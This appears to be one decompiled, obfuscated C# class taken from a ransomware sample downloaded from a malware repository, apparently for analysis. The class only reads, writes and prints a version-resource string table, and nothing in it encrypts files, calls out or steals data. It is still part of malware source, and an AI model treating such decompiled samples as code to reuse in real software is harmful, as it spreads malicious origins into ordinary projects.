// Decompiled with JetBrains decompiler
// Type: ns8.Class21
// Assembly: TRM, Version=1.0.4536.20171, Culture=neutral, PublicKeyToken=null
// MVID: D733ED76-728C-4EAC-B876-1EF3213B4E77
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-5317fa25888393a66762b1c7cc31ee17f67d6ab3556c64822c82a111afea6614.exe

using ns0;
using ns2;
using ns5;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

namespace ns8
{
  internal sealed class Class21 : Class20
  {
    private Dictionary<string, Class19> dictionary_0 = new Dictionary<string, Class19>();

    public Class21()
    {
    }

    internal Class21(IntPtr intptr_0) => this.vmethod_0(intptr_0);

    internal override IntPtr vmethod_0(IntPtr intptr_0)
    {
      this.dictionary_0.Clear();
      Class19 class19;
      for (IntPtr intptr_0_1 = base.vmethod_0(intptr_0); intptr_0_1.ToInt32() < intptr_0.ToInt32() + (int) this.struct2_0.ushort_0; intptr_0_1 = Class15.smethod_0(intptr_0_1.ToInt32() + (int) class19.method_0().ushort_0))
      {
        class19 = new Class19(intptr_0_1);
        this.dictionary_0.Add(class19.method_1(), class19);
      }
      return new IntPtr(intptr_0.ToInt32() + (int) this.struct2_0.ushort_0);
    }

    internal override void vmethod_1(BinaryWriter binaryWriter_0)
    {
      long position = binaryWriter_0.BaseStream.Position;
      base.vmethod_1(binaryWriter_0);
      int count = this.dictionary_0.Count;
      Dictionary<string, Class19>.Enumerator enumerator = this.dictionary_0.GetEnumerator();
      while (enumerator.MoveNext())
      {
        enumerator.Current.Value.method_6(binaryWriter_0);
        Class15.smethod_5(binaryWriter_0, binaryWriter_0.BaseStream.Position - position, position);
        if (--count != 0)
          Class15.smethod_2(binaryWriter_0);
      }
    }

    [SpecialName]
    public ushort method_3() => string.IsNullOrEmpty(this.string_0) ? (ushort) 0 : Convert.ToUInt16(this.string_0.Substring(0, 4), 16);

    [SpecialName]
    public void method_4(ushort ushort_0) => this.string_0 = string.Format("{0:x4}{1:x4}", (object) ushort_0, (object) this.method_5());

    [SpecialName]
    public ushort method_5() => string.IsNullOrEmpty(this.string_0) ? (ushort) 0 : Convert.ToUInt16(this.string_0.Substring(4, 4), 16);

    [SpecialName]
    public void method_6(ushort ushort_0) => this.string_0 = string.Format("{0:x4}{1:x4}", (object) this.method_3(), (object) ushort_0);

    public string this[string string_1]
    {
      get => this.dictionary_0[string_1].method_3();
      set
      {
        Class19 class19 = (Class19) null;
        if (!this.dictionary_0.TryGetValue(string_1, out class19))
        {
          class19 = new Class19(string_1);
          this.dictionary_0.Add(string_1, class19);
        }
        class19.method_4(value);
      }
    }

    public override string vmethod_2(int int_0)
    {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine(string.Format("{0}BEGIN", (object) new string(' ', int_0)));
      stringBuilder.AppendLine(string.Format("{0}BLOCK \"{1}\"", (object) new string(' ', int_0 + 1), (object) this.string_0));
      stringBuilder.AppendLine(string.Format("{0}BEGIN", (object) new string(' ', int_0 + 1)));
      foreach (Class19 class19 in this.dictionary_0.Values)
        stringBuilder.AppendLine(string.Format("{0}VALUE \"{1}\", \"{2}\"", (object) new string(' ', int_0 + 2), (object) class19.method_1(), (object) class19.method_2()));
      stringBuilder.AppendLine(string.Format("{0}END", (object) new string(' ', int_0 + 1)));
      stringBuilder.AppendLine(string.Format("{0}END", (object) new string(' ', int_0)));
      return stringBuilder.ToString();
    }
  }
}
